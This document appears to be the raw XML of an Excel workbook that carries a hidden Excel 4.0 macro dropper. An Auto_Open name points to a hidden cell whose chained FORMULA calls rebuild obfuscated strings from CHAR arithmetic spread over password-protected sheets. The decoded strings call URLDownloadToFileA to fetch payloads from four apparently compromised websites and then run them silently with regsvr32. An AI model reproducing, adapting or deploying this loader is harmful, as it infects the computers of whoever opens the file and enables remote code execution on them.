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ydar\Desktop\Filee1\06 nov\ZV\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="8_{50C37548-5748-4716-9F5D-5DC36ED6A9FC}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-120" windowWidth="20730" windowHeight="11160"/>
  </bookViews>
  <sheets>
    <sheet name="Sheet" sheetId="1" r:id="rId1"/>
    <sheet name="Sheet1" sheetId="2" r:id="rId2"/>
    <sheet name="Sheet2" sheetId="3" r:id="rId3"/>
    <sheet name="Sheet3" sheetId="4" r:id="rId4"/>
    <sheet name="Sheet4" sheetId="5" r:id="rId5"/>
    <sheet name="Sheet5" sheetId="9" r:id="rId6"/>
    <sheet name="Sheet6" sheetId="8" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open07457358934307593258350725798323209">Sheet6!$G$3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5" l="1"/>
  <c r="N10" i="5"/>
  <c r="L14" i="5"/>
  <c r="L10" i="5"/>
  <c r="J14" i="5"/>
  <c r="J10" i="5"/>
  <c r="H14" i="5"/>
  <c r="H10" i="5"/>
  <c r="D5" i="4"/>
  <c r="L8" i="4"/>
  <c r="R13" i="4"/>
  <c r="J14" i="4"/>
  <c r="F19" i="4"/>
  <c r="O23" i="4"/>
  <c r="M26" i="4"/>
  <c r="C32" i="4"/>
  <c r="J3" i="9"/>
  <c r="E9" i="9"/>
  <c r="L12" i="9"/>
  <c r="G15" i="9"/>
  <c r="E21" i="5"/>
  <c r="F28" i="2"/>
  <c r="O18" i="2"/>
  <c r="R17" i="2"/>
  <c r="T16" i="2"/>
  <c r="M16" i="2"/>
  <c r="C16" i="2"/>
  <c r="P15" i="2"/>
  <c r="N14" i="2"/>
  <c r="F6" i="3"/>
  <c r="E14" i="2"/>
  <c r="S13" i="2"/>
  <c r="L13" i="2"/>
  <c r="H13" i="2"/>
  <c r="Q11" i="2"/>
  <c r="O11" i="2"/>
  <c r="B11" i="2"/>
  <c r="N19" i="3"/>
  <c r="K10" i="2"/>
  <c r="F10" i="2"/>
  <c r="T9" i="2"/>
  <c r="P8" i="2"/>
  <c r="M8" i="2"/>
  <c r="G8" i="2"/>
  <c r="V7" i="2"/>
  <c r="L7" i="2"/>
  <c r="Q6" i="2"/>
  <c r="D6" i="2"/>
  <c r="S5" i="2"/>
  <c r="J5" i="2"/>
  <c r="T4" i="2"/>
  <c r="M4" i="2"/>
  <c r="A4" i="2"/>
  <c r="O3" i="2"/>
  <c r="I3" i="2"/>
  <c r="B3" i="2"/>
  <c r="S2" i="2"/>
  <c r="R3" i="3"/>
  <c r="K2" i="2"/>
  <c r="E2" i="2"/>
  <c r="Q21" i="9"/>
  <c r="J29" i="3"/>
  <c r="I27" i="3"/>
  <c r="G28" i="3"/>
  <c r="F26" i="3"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="27" uniqueCount="26">
  <si>
    <t>X</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>d</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>"</t>
  </si>
  <si>
    <t>:</t>
  </si>
  <si>
    <t>=</t>
  </si>
  <si>
    <t>,</t>
  </si>
  <si>
    <t>\</t>
  </si>
  <si>
    <t>C</t>
  </si>
  <si>
    <t>A</t>
  </si>
  <si>
    <t>.</t>
  </si>
  <si>
    <t>L</t>
  </si>
  <si>
    <t>&amp;</t>
  </si>
  <si>
    <t>(</t>
  </si>
  <si>
    <t>U</t>
  </si>
  <si>
    <t>-</t>
  </si>
  <si>
    <t>)</t>
  </si>
  <si>
    <t>T</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>R</t>
  </si>
  <si>
    <t>E</t>
  </si>
  <si>
    <t>N</t>
  </si>
  <si>
    <t>RETUR</t>
  </si>
  <si>
    <t>()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</si>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</sst>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CF7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Fill="1" applyProtection="1">
      <protection hidden="1"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="2" borderId="0" xfId="0" applyFill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IntlMacrosheet" Target="macrosheets/intlsheet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9525</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>15</xdr:col>
      <xdr:colOff>57150</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1000125</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="3115" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{049B3142-4548-476A-84E0-F127D82111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9525"/>
          <a:ext cx="9058275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0</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>16</xdr:col>
      <xdr:colOff>409575</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>0</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="6156" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3ECC9AC0-A581-4CAD-AAFB-E1001DFC2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0"/>
          <a:ext cx="1002982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0</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>15</xdr:col>
      <xdr:colOff>457200</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1038225</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="7178" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E46BABE-0DC1-4925-BA70-AA40FEA884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0"/>
          <a:ext cx="9505950" cy="1038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16</xdr:col>
      <xdr:colOff>257175</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1085850</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="5129" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE0D9FBD-F08E-4A4C-8B93-8DEA2AF4CC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9944100" cy="1085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16</xdr:col>
      <xdr:colOff>0</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1057275</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="1032" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD7A0135-E570-46A5-9334-4E12A46FE0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9686925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0</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>15</xdr:col>
      <xdr:colOff>438150</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1038225</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="4103" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0838DC75-8BDA-4FD6-9075-E84910317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0"/>
          <a:ext cx="9505950" cy="1038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9</xdr:col>
      <xdr:colOff>495300</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>1085850</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="2055" name="Рисунок 2">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{834A13D3-B397-4BBC-96FF-380B15AC4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0"/>
          <a:ext cx="9944100" cy="1085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G1:G13"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="D116" sqref="D116"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.7109375" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="6" max="6" width="7.7109375" customWidth="1"/>
    <col min="7" max="7" width="7.7109375" hidden="1" customWidth="1"/>
    <col min="8" max="8" width="7.7109375" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="7:7" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="13" spans="7:7" x14ac:dyDescent="0.25">
      <c r="G13" t="b">
        <f>FORMULA(Sheet1!L24&amp;Sheet1!L26&amp;Sheet1!L27&amp;Sheet1!L28&amp;Sheet1!L28&amp;Sheet2!F6&amp;Sheet2!N19&amp;Sheet1!F10&amp;Sheet2!R3&amp;Sheet5!Q21&amp;Sheet2!F26&amp;Sheet3!R13&amp;Sheet5!E9&amp;Sheet3!M26,G16)=FORMULA(Sheet1!L24&amp;Sheet1!G8&amp;Sheet1!F4&amp;Sheet1!G8&amp;Sheet1!L26&amp;Sheet1!L30&amp;Sheet1!F24&amp;Sheet1!L26&amp;Sheet3!F19&amp;Sheet3!D5&amp;Sheet1!A4&amp;Sheet3!J14&amp;Sheet1!A4&amp;Sheet3!C32&amp;Sheet1!F10&amp;Sheet3!O23&amp;Sheet3!P21&amp;Sheet3!L8&amp;Sheet5!E9&amp;Sheet1!F24&amp;Sheet1!L31,G18)=FORMULA(Sheet1!L24&amp;Sheet1!L26&amp;Sheet1!L27&amp;Sheet1!L28&amp;Sheet1!L28&amp;Sheet2!F6&amp;Sheet2!N19&amp;Sheet1!F10&amp;Sheet2!R3&amp;Sheet5!Q21&amp;Sheet2!G28&amp;Sheet3!R13&amp;Sheet5!G15&amp;Sheet3!M26,G20)=FORMULA(Sheet1!L24&amp;Sheet1!G8&amp;Sheet1!F4&amp;Sheet1!G8&amp;Sheet1!L26&amp;Sheet1!L30&amp;Sheet1!F24&amp;Sheet1!L26&amp;Sheet3!F19&amp;Sheet3!D5&amp;Sheet1!A4&amp;Sheet3!J14&amp;Sheet1!A4&amp;Sheet3!C32&amp;Sheet1!F10&amp;Sheet3!O23&amp;Sheet3!P21&amp;Sheet3!L8&amp;Sheet5!G15&amp;Sheet1!F24&amp;Sheet1!L31,G22)=FORMULA(Sheet1!L24&amp;Sheet1!L26&amp;Sheet1!L27&amp;Sheet1!L28&amp;Sheet1!L28&amp;Sheet2!F6&amp;Sheet2!N19&amp;Sheet1!F10&amp;Sheet2!R3&amp;Sheet5!Q21&amp;Sheet2!I27&amp;Sheet3!R13&amp;Sheet5!J3&amp;Sheet3!M26,G24)=FORMULA(Sheet1!L24&amp;Sheet1!G8&amp;Sheet1!F4&amp;Sheet1!G8&amp;Sheet1!L26&amp;Sheet1!L30&amp;Sheet1!F24&amp;Sheet1!L26&amp;Sheet3!F19&amp;Sheet3!D5&amp;Sheet1!A4&amp;Sheet3!J14&amp;Sheet1!A4&amp;Sheet3!C32&amp;Sheet1!F10&amp;Sheet3!O23&amp;Sheet3!P21&amp;Sheet3!L8&amp;Sheet5!J3&amp;Sheet1!F24&amp;Sheet1!L31,G26)=FORMULA(Sheet1!L24&amp;Sheet1!L26&amp;Sheet1!L27&amp;Sheet1!L28&amp;Sheet1!L28&amp;Sheet2!F6&amp;Sheet2!N19&amp;Sheet1!F10&amp;Sheet2!R3&amp;Sheet5!Q21&amp;Sheet2!J29&amp;Sheet3!R13&amp;Sheet5!L12&amp;Sheet3!M26,G28)=FORMULA(Sheet1!L24&amp;Sheet1!G8&amp;Sheet1!F4&amp;Sheet1!G8&amp;Sheet1!L26&amp;Sheet1!L30&amp;Sheet1!F24&amp;Sheet1!L26&amp;Sheet3!F19&amp;Sheet3!D5&amp;Sheet1!A4&amp;Sheet3!J14&amp;Sheet1!A4&amp;Sheet3!C32&amp;Sheet1!F10&amp;Sheet3!O23&amp;Sheet3!P21&amp;Sheet3!L8&amp;Sheet5!L12&amp;Sheet1!F24&amp;Sheet1!L31,G30)=FORMULA(Sheet1!L24&amp;Sheet1!G44&amp;Sheet1!H46&amp;Sheet1!J44,G36)</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <drawing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Normal="100" workbookViewId="0">
      <selection activeCell="K114" sqref="K114"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
  </sheetData>
  <sheetProtection password="CC4D" sheet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V50"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F112" sqref="F112"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="3"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:22" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="2" spans="1:22" x14ac:dyDescent="0.25">
      <c r="E2" s="3" t="str">
        <f>CHAR(216/2)</f>
        <v>l</v>
      </c>
      <c r="K2" s="3" t="str">
        <f>CHAR(35*2)</f>
        <v>F</v>
      </c>
      <c r="S2" s="3" t="str">
        <f>CHAR(100-35)</f>
        <v>A</v>
      </c>
    </row>
    <row r="3" spans="1:22" x14ac:dyDescent="0.25">
      <c r="B3" s="3" t="str">
        <f>CHAR(236-118)</f>
        <v>v</v>
      </c>
      <c r="I3" s="3" t="str">
        <f>CHAR(238/2)</f>
        <v>w</v>
      </c>
      <c r="O3" s="3" t="str">
        <f>CHAR(134/2)</f>
        <v>C</v>
      </c>
      <c r="U3" s="3">
        <v>5</v>
      </c>
    </row>
    <row r="4" spans="1:22" x14ac:dyDescent="0.25">
      <c r="A4" s="3" t="str">
        <f>CHAR(228/2)</f>
        <v>r</v>
      </c>
      <c r="F4" s="3" t="s">
        <v>0</v>
      </c>
      <c r="M4" s="3" t="str">
        <f>CHAR(148/2)</f>
        <v>J</v>
      </c>
      <c r="Q4" s="3">
        <v>1</v>
      </c>
      <c r="T4" s="3" t="str">
        <f>CHAR(42*2)</f>
        <v>T</v>
      </c>
    </row>
    <row r="5" spans="1:22" x14ac:dyDescent="0.25">
      <c r="J5" s="3" t="str">
        <f>CHAR(52*2)</f>
        <v>h</v>
      </c>
      <c r="S5" s="3" t="str">
        <f>CHAR(100/2)</f>
        <v>2</v>
      </c>
    </row>
    <row r="6" spans="1:22" x14ac:dyDescent="0.25">
      <c r="D6" s="3" t="str">
        <f>CHAR(185-110)</f>
        <v>K</v>
      </c>
      <c r="Q6" s="3" t="str">
        <f>CHAR(220-111)</f>
        <v>m</v>
      </c>
    </row>
    <row r="7" spans="1:22" x14ac:dyDescent="0.25">
      <c r="L7" s="3" t="str">
        <f>CHAR(170/2)</f>
        <v>U</v>
      </c>
      <c r="V7" s="3" t="str">
        <f>CHAR(224/2)</f>
        <v>p</v>
      </c>
    </row>
    <row r="8" spans="1:22" x14ac:dyDescent="0.25">
      <c r="G8" s="3" t="str">
        <f>CHAR(109-40)</f>
        <v>E</v>
      </c>
      <c r="M8" s="3" t="str">
        <f>CHAR(200-100)</f>
        <v>d</v>
      </c>
      <c r="P8" s="3" t="str">
        <f>CHAR(232/2)</f>
        <v>t</v>
      </c>
    </row>
    <row r="9" spans="1:22" x14ac:dyDescent="0.25">
      <c r="T9" s="3" t="str">
        <f>CHAR(194/2)</f>
        <v>a</v>
      </c>
    </row>
    <row r="10" spans="1:22" x14ac:dyDescent="0.25">
      <c r="F10" s="3" t="str">
        <f>CHAR(203-102)</f>
        <v>e</v>
      </c>
      <c r="K10" s="3" t="str">
        <f>CHAR(164-82)</f>
        <v>R</v>
      </c>
    </row>
    <row r="11" spans="1:22" x14ac:dyDescent="0.25">
      <c r="B11" s="3" t="str">
        <f>CHAR(220/2)</f>
        <v>n</v>
      </c>
      <c r="H11" s="3">
        <v>4</v>
      </c>
      <c r="O11" s="3" t="str">
        <f>CHAR(96/2)</f>
        <v>0</v>
      </c>
      <c r="Q11" s="3" t="str">
        <f>CHAR(136/2)</f>
        <v>D</v>
      </c>
    </row>
    <row r="13" spans="1:22" x14ac:dyDescent="0.25">
      <c r="H13" s="3" t="str">
        <f>CHAR(166/2)</f>
        <v>S</v>
      </c>
      <c r="L13" s="3" t="str">
        <f>CHAR(33*2)</f>
        <v>B</v>
      </c>
      <c r="S13" s="3" t="str">
        <f>CHAR(210/2)</f>
        <v>i</v>
      </c>
    </row>
    <row r="14" spans="1:22" x14ac:dyDescent="0.25">
      <c r="E14" s="3" t="str">
        <f>CHAR(240-120)</f>
        <v>x</v>
      </c>
      <c r="F14" s="3">
        <v>3</v>
      </c>
      <c r="N14" s="3" t="str">
        <f>CHAR(217-100)</f>
        <v>u</v>
      </c>
    </row>
    <row r="15" spans="1:22" x14ac:dyDescent="0.25">
      <c r="I15" s="3" t="s">
        <v>1</v>
      </c>
      <c r="P15" s="3" t="str">
        <f>CHAR(202-103)</f>
        <v>c</v>
      </c>
    </row>
    <row r="16" spans="1:22" x14ac:dyDescent="0.25">
      <c r="C16" s="3" t="str">
        <f>CHAR(206-103)</f>
        <v>g</v>
      </c>
      <c r="M16" s="3" t="str">
        <f>CHAR(152-76)</f>
        <v>L</v>
      </c>
      <c r="T16" s="3" t="str">
        <f>CHAR(242/2)</f>
        <v>y</v>
      </c>
    </row>
    <row r="17" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F17" s="3" t="s">
        <v>2</v>
      </c>
      <c r="G17" s="3" t="s">
        <v>3</v>
      </c>
      <c r="R17" s="3" t="str">
        <f>CHAR(212-101)</f>
        <v>o</v>
      </c>
    </row>
    <row r="18" spans="3:21" x14ac:dyDescent="0.25">
      <c r="O18" s="3" t="str">
        <f>CHAR(230/2)</f>
        <v>s</v>
      </c>
    </row>
    <row r="21" spans="3:21" x14ac:dyDescent="0.25">
      <c r="U21" s="3">
        <v>1</v>
      </c>
    </row>
    <row r="24" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F24" s="3" t="s">
        <v>4</v>
      </c>
      <c r="H24" s="3" t="s">
        <v>5</v>
      </c>
      <c r="L24" s="3" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="26" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F26" s="3" t="s">
        <v>7</v>
      </c>
      <c r="H26" s="3" t="s">
        <v>8</v>
      </c>
      <c r="L26" s="3" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="27" spans="3:21" x14ac:dyDescent="0.25">
      <c r="L27" s="3" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="28" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F28" s="3" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="H28" s="3" t="s">
        <v>11</v>
      </c>
      <c r="L28" s="3" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="29" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F29" s="3" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="30" spans="3:21" x14ac:dyDescent="0.25">
      <c r="L30" s="3" t="s">
        <v>14</v>
      </c>
    </row>
    <row r="31" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F31" s="3" t="s">
        <v>15</v>
      </c>
      <c r="H31" s="3" t="s">
        <v>16</v>
      </c>
      <c r="L31" s="3" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="32" spans="3:21" x14ac:dyDescent="0.25">
      <c r="C32" s="3" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="33" spans="3:10" x14ac:dyDescent="0.25">
      <c r="H33" s="3" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="36" spans="3:10" x14ac:dyDescent="0.25">
      <c r="E36" s="3" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="38" spans="3:10" x14ac:dyDescent="0.25">
      <c r="C38" s="3" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="42" spans="3:10" x14ac:dyDescent="0.25">
      <c r="E42" s="3" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="44" spans="3:10" x14ac:dyDescent="0.25">
      <c r="G44" s="3" t="s">
        <v>23</v>
      </c>
      <c r="J44" s="3" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="46" spans="3:10" x14ac:dyDescent="0.25">
      <c r="H46" s="3" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="50" spans="12:12" x14ac:dyDescent="0.25">
      <c r="L50" s="3" t="s">
        <v>25</v>
      </c>
    </row>
  </sheetData>
  <sheetProtection password="CC4D" sheet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F1:R29"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E110" sqref="E110"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="6:18" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="3" spans="6:18" x14ac:dyDescent="0.25">
      <c r="R3" s="2" t="str">
        <f>T(Sheet1!S2&amp;Sheet1!F24&amp;Sheet1!F26&amp;Sheet1!F24&amp;Sheet1!M4&amp;Sheet1!M4&amp;Sheet1!O3&amp;Sheet1!O3&amp;Sheet1!L13&amp;Sheet1!L13&amp;Sheet1!F24)</f>
        <v>A","JJCCBB"</v>
      </c>
    </row>
    <row r="6" spans="6:18" x14ac:dyDescent="0.25">
      <c r="F6" s="2" t="str">
        <f>T(Sheet1!L30&amp;Sheet1!F24&amp;Sheet1!N14&amp;Sheet1!A4&amp;Sheet1!E2&amp;Sheet1!Q6&amp;Sheet1!R17)</f>
        <v>("urlmo</v>
      </c>
    </row>
    <row r="19" spans="6:14" x14ac:dyDescent="0.25">
      <c r="N19" s="2" t="str">
        <f>T(Sheet1!B11&amp;Sheet1!F24&amp;Sheet1!F26&amp;Sheet1!F24&amp;Sheet1!L7&amp;Sheet1!K10&amp;Sheet1!M16&amp;Sheet1!Q11&amp;Sheet1!R17&amp;Sheet1!I3&amp;Sheet1!B11&amp;Sheet1!E2&amp;Sheet1!R17&amp;Sheet1!T9&amp;Sheet1!M8&amp;Sheet1!T4&amp;Sheet1!R17&amp;Sheet1!K2&amp;Sheet1!S13&amp;Sheet1!E2)</f>
        <v>n","URLDownloadToFil</v>
      </c>
    </row>
    <row r="26" spans="6:14" x14ac:dyDescent="0.25">
      <c r="F26" s="2" t="str">
        <f>T(Sheet4!H10&amp;Sheet4!H14&amp;Sheet4!E21)</f>
        <v>s://datie-tw.com/img/SvH/","</v>
      </c>
    </row>
    <row r="27" spans="6:14" x14ac:dyDescent="0.25">
      <c r="I27" s="2" t="str">
        <f>T(Sheet4!L10&amp;Sheet4!L14&amp;Sheet4!E21)</f>
        <v>://championsfactorysampaios.com.br/xt5HKu/tDs8WsKOxQFq/","</v>
      </c>
    </row>
    <row r="28" spans="6:14" x14ac:dyDescent="0.25">
      <c r="G28" s="2" t="str">
        <f>T(Sheet4!J10&amp;Sheet4!J14&amp;Sheet4!E21)</f>
        <v>://central-nutrition.com/wp-content/Nh1L6YR4qlDFWS58cVB/","</v>
      </c>
    </row>
    <row r="29" spans="6:14" x14ac:dyDescent="0.25">
      <c r="J29" s="2" t="str">
        <f>T(Sheet4!N10&amp;Sheet4!N14&amp;Sheet4!E21)</f>
        <v>s://dacsandongthapmuoi.vn/system/cron/HwOtNCFo/","</v>
      </c>
    </row>
  </sheetData>
  <sheetProtection password="CC4D" sheet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C1:R32"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E117" sqref="E117"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="4:18" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="5" spans="4:18" x14ac:dyDescent="0.25">
      <c r="D5" s="2" t="str">
        <f>T("System32\")</f>
        <v>System32\</v>
      </c>
    </row>
    <row r="8" spans="4:18" x14ac:dyDescent="0.25">
      <c r="L8" s="2" t="str">
        <f>T(Sheet1!F28&amp;Sheet1!H28&amp;Sheet1!H28&amp;Sheet1!H26)</f>
        <v xml:space="preserve"> ..\</v>
      </c>
    </row>
    <row r="13" spans="4:18" x14ac:dyDescent="0.25">
      <c r="R13" s="2" t="str">
        <f>T(Sheet1!H28&amp;Sheet1!H28&amp;Sheet1!H26)</f>
        <v>..\</v>
      </c>
    </row>
    <row r="14" spans="4:18" x14ac:dyDescent="0.25">
      <c r="J14" s="2" t="str">
        <f>T(Sheet1!F10&amp;Sheet1!C16&amp;Sheet1!O18&amp;Sheet1!B3)</f>
        <v>egsv</v>
      </c>
    </row>
    <row r="19" spans="3:15" x14ac:dyDescent="0.25">
      <c r="F19" s="2" t="str">
        <f>T(":\Windows\")</f>
        <v>:\Windows\</v>
      </c>
    </row>
    <row r="23" spans="3:15" x14ac:dyDescent="0.25">
      <c r="O23" s="2" t="str">
        <f>T(Sheet1!F28&amp;Sheet1!H33&amp;Sheet1!H13)</f>
        <v xml:space="preserve"> /S</v>
      </c>
    </row>
    <row r="26" spans="3:15" x14ac:dyDescent="0.25">
      <c r="M26" s="2" t="str">
        <f>T(Sheet1!F24&amp;Sheet1!F26&amp;Sheet1!O11&amp;Sheet1!F26&amp;Sheet1!O11&amp;Sheet1!L31)</f>
        <v>",0,0)</v>
      </c>
    </row>
    <row r="32" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C32" s="2" t="str">
        <f>T(Sheet1!F14&amp;Sheet1!S5&amp;Sheet1!H28&amp;Sheet1!F10&amp;Sheet1!E14)</f>
        <v>32.ex</v>
      </c>
    </row>
  </sheetData>
  <sheetProtection password="CC4D" sheet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E1:N21"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F91" sqref="F91"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="8:14" s="5" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="7" spans="8:14" x14ac:dyDescent="0.25">
      <c r="H7" s="1">
        <v>1</v>
      </c>
      <c r="J7" s="1">
        <v>2</v>
      </c>
      <c r="L7" s="1">
        <v>3</v>
      </c>
      <c r="N7" s="1">
        <v>4</v>
      </c>
    </row>
    <row r="10" spans="8:14" x14ac:dyDescent="0.25">
      <c r="H10" s="1" t="str">
        <f>TEXT("s://datie-t",7644664363735)</f>
        <v>s://datie-t</v>
      </c>
      <c r="J10" s="1" t="str">
        <f>TEXT("://central-nutrition.co",25746656376857)</f>
        <v>://central-nutrition.co</v>
      </c>
      <c r="L10" s="1" t="str">
        <f>TEXT("://championsfactorysampai",73643366879764600000)</f>
        <v>://championsfactorysampai</v>
      </c>
      <c r="N10" s="1" t="str">
        <f>TEXT("s://dacsandongthapmu",15764654657687800)</f>
        <v>s://dacsandongthapmu</v>
      </c>
    </row>
    <row r="14" spans="8:14" x14ac:dyDescent="0.25">
      <c r="H14" s="1" t="str">
        <f>TEXT("w.com/img/SvH/",8607574574686840000)</f>
        <v>w.com/img/SvH/</v>
      </c>
      <c r="J14" s="1" t="str">
        <f>TEXT("m/wp-content/Nh1L6YR4qlDFWS58cVB/",95465475763675700)</f>
        <v>m/wp-content/Nh1L6YR4qlDFWS58cVB/</v>
      </c>
      <c r="L14" s="1" t="str">
        <f>TEXT("os.com.br/xt5HKu/tDs8WsKOxQFq/",563567534647465)</f>
        <v>os.com.br/xt5HKu/tDs8WsKOxQFq/</v>
      </c>
      <c r="N14" s="1" t="str">
        <f>TEXT("oi.vn/system/cron/HwOtNCFo/",769767456547686000)</f>
        <v>oi.vn/system/cron/HwOtNCFo/</v>
      </c>
    </row>
    <row r="21" spans="5:5" x14ac:dyDescent="0.25">
      <c r="E21" s="1" t="str">
        <f>T(Sheet1!F24&amp;Sheet1!F26&amp;Sheet1!F24)</f>
        <v>","</v>
      </c>
    </row>
  </sheetData>
  <sheetProtection password="CC4D" sheet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Q21"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="H105" sqref="H105"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="5:12" s="4" customFormat="1" ht="86.25" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="3" spans="5:12" x14ac:dyDescent="0.25">
      <c r="J3" s="1" t="str">
